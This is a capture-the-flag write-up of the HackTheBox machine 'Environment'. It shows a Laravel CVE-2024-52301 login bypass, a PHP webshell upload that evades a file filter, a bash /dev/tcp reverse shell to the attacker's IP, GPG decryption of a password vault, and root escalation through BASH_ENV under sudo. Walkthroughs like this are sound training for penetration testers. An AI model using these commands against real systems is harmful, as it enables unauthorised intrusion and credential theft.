---
title: 'HTB Writeup - Environment'
date: 2025-11-06 17:00:00 +0000
categories: [HTB Medium Machines]
tags: [Medium, Linux, HTB, PHP, Laravel, CVE-2024-52301, File Upload, GPG, BASH_ENV, Path Hijacking]
---

<img src="/assets/img/environment/image.png" alt="/assets/img/environment/image.png">

Environment is a medium HTB machine where thanks to `information disclosure` we find a vulnerable `Laravel` version that allows us to bypass a login screen. From there we gain access to the machine thanks to `file upload`, inside we can use `GPG` to decrypt a sensitive file letting us move laterally. Finally we abuse `path hijacking` in a script that we can run as sudo to root the machine.

# Reconnaissance
```bash
[t3mpx@parrot]─[~/htb/medium/environment]
└──★$ nmap -np- -Pn -sVC --min-rate 5000 -oN nmap-scan.txt 10.10.11.67
Nmap scan report for 10.10.11.67
Host is up (0.037s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://environment.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May  6 10:57:52 2025 -- 1 IP address (1 host up) scanned in 17.48 seconds
```
> SSH, HTTP

> Let’s add the domain to our /etc/hosts file: `echo -e '10.10.11.67\tenvironment.htb' | sudo tee -a /etc/hosts`

Let's have a look at [http://environment.htb](http://environment.htb):
<img src="/assets/img/environment/image2.png" alt="/assets/img/environment/image2.png">

Fuzzing for directories reveals some interesting stuff:

```bash
[t3mpx@parrot]─[~/htb/medium/environment]
└──★$ ffuf -u http://environment.htb/FUZZ -c -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -ic -sa -mc all -fc 404              
                                                                                                                                                            
        /'___\  /'___\           /'___\                                                                                                                     
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                     
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                    
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                    
         \ \_\   \ \_\  \ \____/  \ \_\                                       
          \/_/    \/_/   \/___/    \/_/                                       
                                                                              
       v2.1.0-dev                                                             
________________________________________________

<SNIP>

________________________________________________

                        [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration:114ms]
login                   [Status: 200, Size: 2391, Words: 532, Lines: 55, Duration: 127ms]
storage                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 33ms]
upload                  [Status: 405, Size: 244869, Words: 46159, Lines: 2576, Duration: 1253ms]
up                      [Status: 200, Size: 2125, Words: 745, Lines: 51, Duration: 111ms]
logout                  [Status: 302, Size: 358, Words: 60, Lines: 12, Duration: 510ms]
vendor                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 33ms]
build                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 33ms]
mailing                 [Status: 405, Size: 244871, Words: 46159, Lines: 2576, Duration: 1324ms]
```

# Exploit
##  CVE-2024-52301

Visiting [http://environment.htb/upload](http://environment.htb/upload) reveals some information about what is running in the background:
<img src="/assets/img/environment/image3.png" alt="/assets/img/environment/image3.png">
> PHP and Laravel version

A quick Google search of the Laravel version shows that it's vulnerable to [CVE-2024-52301](https://github.com/Nyamort/CVE-2024-52301).

Intercepting the login request from [http://environment.htb/login](http://environment.htb/login) using BurpSuite and removing the value of `remember` will return an internal server error with some information:
<img src="/assets/img/environment/image4.png" alt="/assets/img/environment/image4.png">
> No `remember` value

<img src="/assets/img/environment/image5.png" alt="/assets/img/environment/image5.png">
> If the environment is set as `preprod`, login directly to `/management/dashboard`

We can now make us of the CVE to bypass the login panel:
<img src="/assets/img/environment/image6.png" alt="/assets/img/environment/image6.png">
> Using `?--env=preprod` to change the environment

We're now inside the management dashboard:
<img src="/assets/img/environment/image7.png" alt="/assets/img/environment/image7.png">

# Lateral Movement
## Shell as www-data

In [http://environment.htb/management/profile](http://environment.htb/management/profile) we can update our profile picture, we can abuse that to upload a `.php` [webshell](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985):
<img src="/assets/img/environment/image8.png" alt="/assets/img/environment/image8.png">
> We added a `.` after the filename to break the filtering, and the GIF magic bytes: `GIF87a` at the beggining of the content itself

Visiting [http://environment.htb/storage/files/shell.php](http://environment.htb/storage/files/shell.php) we access the webshell:
<img src="/assets/img/environment/image9.png" alt="/assets/img/environment/image9.png">

Let's get a reverse shell for more commodity:
```bash
bash -c 'bash  -i >& /dev/tcp/10.10.14.20/9001 0>&1'
```

```bash
[t3mpx@parrot]─[~/htb/medium/environment]
└──★$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.11.67] 59656
bash: cannot set terminal process group (896): Inappropriate ioctl for device
bash: no job control in this shell
www-data@environment:~/app/storage/app/public/files$
```

### User flag
```bash
www-data@environment:/home/hish$ cat user.txt 
3fb5fa82d8622bdd2362a456f2d062b1
```

## Shell as hish
Inside the home folder of the user `hish`, we can find a `.gpg` encrypted file called `keyvault.gpg` and a `.gnupg` folder containing private keys, with this we can decrypt the forementioned encrypted file:

```bash
www-data@environment:/home/hish$ cp -R .gnupg /tmp && GNUPGHOME=/tmp/.gnupg gpg --decrypt backup/keyvault.gpg
gpg: WARNING: unsafe permissions on homedir '/tmp/.gnupg'
gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

We have a valid credential:
```bash
[t3mpx@parrot]─[~/htb/medium/environment]
└──★$ nxc ssh 10.10.11.67 -u hish -p pass.txt 
SSH         10.10.11.67     22     10.10.11.67      [*] SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u5
SSH         10.10.11.67     22     10.10.11.67      [-] hish:Ihaves0meMon$yhere123
SSH         10.10.11.67     22     10.10.11.67      [+] hish:marineSPm@ster!!  Linux - Shell access!
```
>hish:marineSPm@ster!!

Let's SSH in:
```bash
[t3mpx@parrot]─[~/htb/medium/environment]
└──★$ ssh hish@environment.htb
hish@environment:~$
```

## Shell as root

Running `sudo -l` reveals that we can run the script `systeminfo` and that the `BASH_ENV` variable is saved when executing it with sudo:
```bash
hish@environment:~$ sudo -l
[sudo] password for hish: 
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
```

Looking inside the file we see a lack of absolute paths, meaning we can path hijack the binaries:
```bash
hish@environment:~$ cat /usr/bin/systeminfo 
#!/bin/bash
echo -e "\n### Displaying kernel ring buffer logs (dmesg) ###"
dmesg | tail -n 10

echo -e "\n### Checking system-wide open ports ###"
ss -antlp

echo -e "\n### Displaying information about all mounted filesystems ###"
mount | column -t

echo -e "\n### Checking system resource limits ###"
ulimit -a

echo -e "\n### Displaying loaded kernel modules ###"
lsmod | head -n 10

echo -e "\n### Checking disk usage for all filesystems ###"
df -h
```

```bash
hish@environment:~$ echo '/bin/bash -p' > /tmp/dmesg && export BASH_ENV=/tmp/dmesg
hish@environment:~$ sudo systeminfo
root@environment:/home/hish#
```

### Root flag
```bash
root@environment:~# cat root.txt
3c79a7e7d6dfb484d4ea6eceac4b8992
```











